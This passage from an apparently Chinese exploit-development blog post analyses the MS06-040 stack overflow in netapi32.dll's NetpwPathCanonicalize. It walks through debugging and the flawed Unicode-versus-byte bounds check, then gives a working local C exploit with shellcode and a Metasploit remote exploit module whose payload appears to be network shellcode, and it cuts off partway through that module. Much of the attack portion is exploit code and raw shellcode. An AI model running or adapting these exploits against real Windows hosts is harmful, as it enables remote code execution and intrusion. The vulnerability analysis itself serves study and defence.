代码时将这个漏洞文件放在工程的相同路径下。</p></blockquote><blockquote><p>netapi32.dll 下载链接:<a href="https://pan.baidu.com/s/1qZQ1vnY">https://pan.baidu.com/s/1qZQ1vnY</a>  密码:5stq</p></blockquote><h4 id="定位程序崩溃点"><a class="markdownIt-Anchor" href="#定位程序崩溃点"></a> 定位程序崩溃点</h4><p>编译运行后，系统会提示出错，直接点调试。进入OD后，按 F9 运行到程序崩溃处，可以看到 EBP 和 EIP 都被覆盖为 “aaaa”。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714123823178-16577739716151.png" alt="image-20220714123823178"></p><p>重新加载程序，调试来到 call netapi32.NetpwPathCanonicalize 处。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714124834735.png" alt="image-20220714124834735"></p><p>进入 NetpwPathCanonicalize() 函数体后，按 “F8” 键继续单步跟踪。程序将在另一次函数调用时崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714132056431.png" alt="image-20220714132056431"></p><p>重新加载，“F7” 继续跟进，最后发现，在函数返回前 pop ebx 中，向栈中压入了大量 b 充当无效数据，导致在 retn 时，返回地址错误，发生崩溃。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714125708003.png" alt="image-20220714125708003"></p><h4 id="构造exploit"><a class="markdownIt-Anchor" href="#构造exploit"></a> 构造exploit</h4><p>反复跟踪后溢出函数后，发现这段程序首先将 prefix 所指的字符串“ bbbbbb……” 复制到栈中，然后在这个字符串后加上 Unicode 字符“\”（ 0x5C00），再将 path 中的长字符串“ aaaa……”连接在末尾，而正是连接 path 串的 wcscat 调用触发了漏洞。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714133733738.png" alt="image-20220714133733738"></p><p>程序“跑飞”之前的系统状态。<br>（ 1） prefix 串中包含了 0xFE 个字符‘b’（ 0x62），被复制到栈帧中开始于 0x0012F240 处的缓冲区。<br>（ 2）程序在 prefix 的末尾连接上 Unicode 字符‘ \’（ 0x005C）。<br>（ 3）程序在‘ \’后连接 0x31E 个字符‘ a’（ 0x61），这次字符串连接操作造成了栈帧溢出，位于 0x0012F654 处的 EBP 及紧随其后的返回地址都被改写。(图26.2.6地址与本次实验地址不同)</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220717224801801.png" alt="image-20220717224801801"></p><p>ECX 在函数返回时总是指向栈中缓冲区，因此我们可以把 shellcode 放在 prefix 串中，并采用JMP ECX 作为定位 shellcode 的跳板。用 OllyDbg 在内存中搜索指令 JMP ECX。</p><p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714152047332.png" alt="image-20220714152047332"></p><p>用 netapi32.dll 自身代码空间中 0x751852F9 处的 CALL ECX 作为跳转指令。</p><p>布置缓冲区如下。<br>（ 1）缓冲区中的内容为： (prefi x:bbb …) +（ \） +（ path: aaa…）。<br>（ 2）目前 prefix 串大小为 0x100（ 256）字节，除去两个字节 null 作为结束符， 254 字节基本能够容纳 shellcode。<br>（ 3）缓冲区起址： 0x0012F240。<br>（ 4） EBP 位置： 0x0012F654。<br>（ 5）返回地址： 0x0012F240。<br>（ 6）返回地址距离缓冲区的偏移为： 0x0012F654-0x0012F240=0x418，去掉 prefix 和 ‘ \’ 的影响， path 串偏移 0x418-0x100=0x318 处的 DWORD 将淹没返回地址，在那里填入跳转地址即可执行 shellcode。</p><p>仍然使用弹出“ failwest”消息框的 shellcode 进行测试，最终的本地溢出利用代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*MYPROC)</span><span class="params">(LPTSTR, LPTSTR, <span class="type">int</span>, LPTSTR, <span class="type">long</span> *, <span class="type">long</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> path[<span class="number">0x320</span>];</span><br><span class="line">    <span class="type">char</span> can_path[<span class="number">0x440</span>];</span><br><span class="line">    <span class="type">int</span> maxbuf=<span class="number">0x440</span>;</span><br><span class="line">    <span class="type">char</span> prefix[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">long</span> pathtype=<span class="number">44</span>;</span><br><span class="line">    HINSTANCE LibHandle;</span><br><span class="line">    MYPROC Trigger;</span><br><span class="line">    <span class="type">char</span> dll[] = <span class="string">&quot;./netapi32.dll&quot;</span>; <span class="comment">// care for the path</span></span><br><span class="line">    <span class="type">char</span> VulFunc[] = <span class="string">&quot;NetpwPathCanonicalize&quot;</span>;</span><br><span class="line">    LibHandle = LoadLibrary(dll);</span><br><span class="line">    Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0</span>,<span class="keyword">sizeof</span>(path));</span><br><span class="line">    <span class="built_in">memset</span>(path,<span class="number">0x90</span>,<span class="keyword">sizeof</span>(path)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="number">0</span>,<span class="keyword">sizeof</span>(prefix));</span><br><span class="line">    <span class="built_in">memset</span>(prefix,<span class="string">&#x27;a&#x27;</span>,<span class="keyword">sizeof</span>(prefix)<span class="number">-2</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(prefix,shellcode,<span class="number">168</span>);</span><br><span class="line">    path[<span class="number">0x318</span>]=<span class="number">0xF9</span>;<span class="comment">// address of CALL ECX</span></span><br><span class="line">    path[<span class="number">0x319</span>]=<span class="number">0x52</span>;</span><br><span class="line">    path[<span class="number">0x31A</span>]=<span class="number">0x18</span>;</span><br><span class="line">    path[<span class="number">0x31B</span>]=<span class="number">0x75</span>;</span><br><span class="line">    (Trigger)(path,can_path,maxbuf,prefix,&amp;pathtype,<span class="number">0</span>);</span><br><span class="line">    FreeLibrary(LibHandle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行，就能看到 failwest 消息框了。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714153344604.png" alt="image-20220714153344604" style="zoom: 50%;"><p>总结一下动态调试的思路。<br>（ 1）第一次调试看到 EIP 已经被改写为 0x61616161，证明传入的参数可以制造溢出并控制EIP，但堆栈被破坏，无法看到溢出前的函数调用。<br>（ 2）跟踪调试，找到 NetpwPathCanonicalize 的 VA 地址，直接对这个 VA 地址下断点。<br>（ 3）单步跟踪 NetpwPathCanonicalize 函数，观察寄存器的变化，发现是其中的一次函数调用引起的错误。<br>（ 4）第三次调试直接针对 NetpwPathCanonicalize 中引起错误的子函数，单步跟踪一轮后，彻底弄清楚栈中布局，编写本地 exploit。</p><h2 id="静态分析"><a class="markdownIt-Anchor" href="#静态分析"></a> 静态分析</h2><p>通过 IDA 加载 netapi32.dll，找到漏洞的缺陷代码，NetpwPathCanonicalize 函数中的 CanoicalizePathName 函数，如下图黄色框内。</p><img src="/2022/07/20/RPC%E5%85%A5%E4%BE%B5%EF%BC%9AMS06-040/image-20220714223348998.png" alt="image-20220714223348998"><p>在动态调试时，我们已经知道产生溢出的函数实际上是 0x7517F856 处调用的的子函数 CanonicalizePathName()， prefix 串与 path 串的合并操作就位于其中，该函数的声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">CanonicalizePathName</span> <span class="params">(</span></span><br><span class="line"><span class="params">    uint16 prefix[ ], <span class="comment">// [in] path prefix</span></span></span><br><span class="line"><span class="params">    uint16path[ ], <span class="comment">// [in] path name</span></span></span><br><span class="line"><span class="params">    uint8 can_path[ ], <span class="comment">// [out] canonicalized path</span></span></span><br><span class="line"><span class="params">    uint32 maxbuf, <span class="comment">// [in] max byte size of can_path</span></span></span><br><span class="line"><span class="params">    uint32 can_size <span class="comment">// [in out] byte size of can_path</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>用 IDA 重点看一下这个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span class="line">; int   stdcall CanonicalizePathName(wchar_t *, wchar_t *, wchar_t*, int, int)</span><br><span class="line">7517FC68 CanonicalizePathName proc near</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 Buff_last_word  = word ptr -416h</span><br><span class="line">7517FC68 Buff_OF         = word ptr -414h</span><br><span class="line">7517FC68 arg_Prefix      = dword ptr  8</span><br><span class="line">7517FC68 arg_Path        = dword ptr  0Ch</span><br><span class="line">7517FC68 arg_CanPath     = dword ptr  10h</span><br><span class="line">7517FC68 arg_Maxbuf      = dword ptr  14h</span><br><span class="line">7517FC68 arg_CanSize     = dword ptr  18h</span><br><span class="line">7517FC68</span><br><span class="line">7517FC68 push   ebp</span><br><span class="line">7517FC69 mov    ebp, esp</span><br><span class="line">7517FC6B sub esp, 414h ; 分配 0x414 字节栈空间，即 Buff_OF，用来</span><br><span class="line">; 存储合并路径(prefix+’\’+path)</span><br><span class="line">7517FC71 push ebx</span><br><span class="line">7517FC72 push esi</span><br><span class="line">7517FC73 xor esi, esi</span><br><span class="line">7517FC75 push edi</span><br><span class="line">7517FC76 cmp [ebp+arg_Prefix], esi</span><br><span class="line">7517FC79 mov edi, ds:__imp_wcslen</span><br><span class="line">7517FC7F mov ebx, 411h ; ebx 始终等于 0x411，用于检查越界（字节）</span><br><span class="line">; 长度</span><br><span class="line">7517FC84 jz short @@prefix_ptr_zero</span><br><span class="line">7517FC86 push [ebp+arg_Prefix]</span><br><span class="line">7517FC89 call edi ; __imp_wcslen</span><br><span class="line">                        ; 计算 prefix 串的 Unicode 长度，注意为字</span><br><span class="line">                        ; 节长度的一半，这是导致边界检查被突破的根</span><br><span class="line">                        ; 本原因，即用 Unicode 检查边界，而栈空间</span><br><span class="line">                        ; 是按字节开的</span><br><span class="line">7517FC8B mov esi, eax ; esi 始终记录 prefix 串的 Unicode 长度</span><br><span class="line">7517FC8D pop ecx</span><br><span class="line">7517FC8E test esi, esi</span><br><span class="line">7517FC90 jz short @@chk_pathname</span><br><span class="line">7517FC92 cmp esi, ebx ; prefix 是否大于 0x411</span><br><span class="line">7517FC94 ja @@err_invalid_name</span><br><span class="line">; 若越界，则退出程序</span><br><span class="line">7517FC9A push [ebp+arg_Prefix]</span><br><span class="line">7517FC9D lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FCA3 push eax</span><br><span class="line">7517FCA4 call ds:__imp_wcscpy</span><br><span class="line">                        ; 将 prefix 串写入栈空间 Buff_OF 暂存。虽然前</span><br><span class="line">                        ; 面的边界检查有缺陷，似乎实际可以传入的 prefix</span><br><span class="line">                        ; 串可以达到 0x822 字节，但是在传入本函数前,</span><br><span class="line">                        ; prefix 串已被 NetpwPathType()检查过，其长度</span><br><span class="line">                        ; 不能超过 0x206 字节，所以光靠这里的检查缺陷</span><br><span class="line">                        ; 还不足以通过 prefix 串制造溢出</span><br><span class="line">…</span><br><span class="line">7517FCED @@prefix_ptr_zero:</span><br><span class="line">7517FCED mov [ebp+Buff_OF], si</span><br><span class="line">7517FCF4 @@chk_pathname:</span><br><span class="line">7517FCF4 push [ebp+arg_Path]</span><br><span class="line">7517FCF7 call edi ; __imp_wcslen</span><br><span class="line">; 计算 path 串的 Unicode 长度</span><br><span class="line">7517FCF9 add eax, esi ; 合并前，计算合并路径(prefix+’\’+path)的</span><br><span class="line">; Unicode 长度</span><br><span class="line">7517FCFB pop ecx</span><br><span class="line">7517FCFC cmp eax, ebx ; 第二次边界检查，仍然将 Unicode 字符长度与</span><br><span class="line">; 字节长度 0x411 进行比较</span><br><span class="line">7517FCFE ja short @@err_invalid_name</span><br><span class="line">                        ; 从前面的分析可以知道，只靠 prefix 串是无法</span><br><span class="line">                        ; 制造溢出的，但是 path 串的传入没有任何限制，</span><br><span class="line">                        ; 所以可以通过增加 path 串的长度溢出。栈空间</span><br><span class="line">                        ; 为 0x414，我们实际可以传入的串总长可以达到</span><br><span class="line">                        ; 或或超过 0x828</span><br><span class="line">7517FD00 push [ebp+arg_Path]</span><br><span class="line">7517FD03 lea eax, [ebp+Buff_OF]</span><br><span class="line">7517FD09 push eax</span><br><span class="line">7517FD0A call ds:__imp_wcscat ; 将 path 串继续连入 Buff_OF，生成最终</span><br><span class="line">                                ; 的合并路径，这个调用导致了最终的栈溢出</span><br><span class="line">…</span><br><span class="line">7517FD3E @@err_invalid_name:</span><br><span class="line">7517FD3E push ERROR_INVALID_NAME</span><br><span class="line">7517FD40 pop eax</span><br><span class="line">7517FD41 jmp short @@quit</span><br><span class="line">…</span><br><span class="line">7517FD7A @@quit:</span><br><span class="line">7517FD7A pop edi</span><br><span class="line">7517FD7B pop esi</span><br><span class="line">7517FD7C pop ebx</span><br><span class="line">7517FD7D leave</span><br><span class="line">7517FD7E retn 14h</span><br><span class="line">7517FD7E CanonicalizePathName endp</span><br><span class="line">; =============== S U B R O U T I N E ===============================</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>两次边界检查的限制都是 Unicode 长度不能超过 0x411，换算成字节长度就是 0x822，而栈空间的大小是按字节开的 0x414。按照 ASCII 字符开辟空间，按照 Unicode 字符来检查边界是漏洞的根本原因。<br>依据以上的溢出原理，只要设计好 prefix 串和 path 串的长度，调用 NetpwPath Canonicalize 函数即可发生栈溢出。</p><h2 id="实现远程-exploit"><a class="markdownIt-Anchor" href="#实现远程-exploit"></a> 实现远程 exploit</h2><p>进行 RPC 调用的代码框架：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">  Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                     </span><br><span class="line">end</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>     =&gt; <span class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span>  =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>   =&gt; [[<span class="string">&#x27;Windows 2000 SP0&#x27;</span>,</span><br><span class="line">                    &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span>, <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                    ]]</span><br><span class="line">        ))</span><br><span class="line">register_options([OptString.new(</span><br><span class="line"><span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                            [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                            ),],</span><br><span class="line">                       self.<span class="keyword">class</span>)</span><br><span class="line">end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;3.0&#x27;</span>, <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = ......</span><br><span class="line">        path = ......</span><br><span class="line">        stub =NDR.long(rand(<span class="number">0xffffffff</span>)) +</span><br><span class="line">            NDR.UnicodeConformantVaryingString(<span class="string">&#x27;&#x27;</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(path) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.UnicodeConformantVaryingStringPreBuilt(prefix) +</span><br><span class="line">            NDR.long(rand(<span class="number">0xf0</span>)+<span class="number">1</span>) +</span><br><span class="line">            NDR.long(<span class="number">0</span>)</span><br><span class="line">        dcerpc.call(<span class="number">0x1f</span>, stub) <span class="comment"># call NetpwPathCanonicalize()</span></span><br><span class="line">        disconnect</span><br><span class="line">        </span><br><span class="line">end <span class="comment">#end of exploit def</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>我们只需要关注 path 串和 prefix 串的内容，在恰当的位置布置特定的内容， MSF 和远程的主机会自动按照 RPC 协议为我们完成网络握手、参数解析、函数定位等工作。</p><p>攻击代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; Msf::Exploit::Remote</span><br><span class="line">    Rank = GoodRanking</span><br><span class="line"> </span><br><span class="line">    include Msf::Exploit::Remote::DCERPC</span><br><span class="line">    include Msf::Exploit::Remote::SMB::Client                      <span class="comment"># 主要就是上面这几行，还有最后一行多了一个end</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info = &#123;&#125;</span>)</span><br><span class="line">        <span class="built_in">super</span>(update_info(info,</span><br><span class="line">            <span class="string">&#x27;Name&#x27;</span>   =&gt; <span class="string">&#x27;MS06-040 Remote overflow POC &#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;win&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Targets&#x27;</span>  =&gt; [[<span class="string">&#x27;Windows 2000 SP0&#x27;</span>,</span><br><span class="line">                            &#123;<span class="string">&#x27;Ret&#x27;</span> =&gt; [<span class="number">0x318</span> , <span class="number">0x74FB62C3</span>]&#125;</span><br><span class="line">                           ]]</span><br><span class="line">             ))</span><br><span class="line">        register_options([OptString.new(</span><br><span class="line">                                <span class="string">&#x27;SMBPIPE&#x27;</span>,</span><br><span class="line">                                [true,<span class="string">&quot;(BROWSER, SRVSVC)&quot;</span>, <span class="string">&#x27;BROWSER&#x27;</span>]</span><br><span class="line">                                ),],</span><br><span class="line">                         self.<span class="keyword">class</span>) </span><br><span class="line">    end <span class="comment">#end of initialize</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">        connect()</span><br><span class="line">        smb_login()</span><br><span class="line">        handle = dcerpc_handle(<span class="string">&#x27;4b324fc8-1670-01d3-1278-5a47bf6ee188&#x27;</span>,</span><br><span class="line">                              <span class="string">&#x27;3.0&#x27;</span>,  <span class="string">&#x27;ncacn_np&#x27;</span>,  [<span class="string">&quot;\\#&#123;datastore[&#x27;SMBPIPE&#x27;]&#125;&quot;</span>])</span><br><span class="line">        dcerpc_bind(handle)</span><br><span class="line">        prefix = <span class="string">&quot;\x8B\xC1\x83\xC0\x05\x59\x81\xC9\xD3\x62\x30\x20\x41\x43\x4D\x64&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77\x73&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60\x8B&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7\x3A&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4\x5E&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3\xAB&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x1A\x0A\x32\xE4\x50&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\x83\xEF\x6C&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50\x50\x56\x50\xFF\x56&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\xE4\xFF\x56\xE8\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span>+</span><br><span class="line">            <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x00\x00&quot;</span></span><br><span class="line">        path = <span class="string">&quot;\x90&quot;</span> * <span class="number">0x318</span> + [target[<span class="string">&#x27;Ret&#x27;</span>][<span class="number">1</span>]].pack(<span class="string">&#x27;V&#x27;</span>) + </span><br><span class="line">            <span class="string">&quot;\x04\xD0\xFD\x7F&quot;</span> * <span class="number">5</span> +    <span class="comment"># writeable address</span></span><br><span class="line">            <span class="string">&quot;\x66\x81\xEC\x30\x04&quot;</span> +    <span class="comment"># sub esp,430</span></span><br><span class="line">            <span class="string">&quot;\x8B\xC4&quot;</span> +             <span class="comment"># mov eax, esp</span></span><br><span class="line">            <span class="string">&quot;\xFF\xE4&quot;</span> +            <span class="comment"># jmp esp</span></span><br><span class="line">            <span 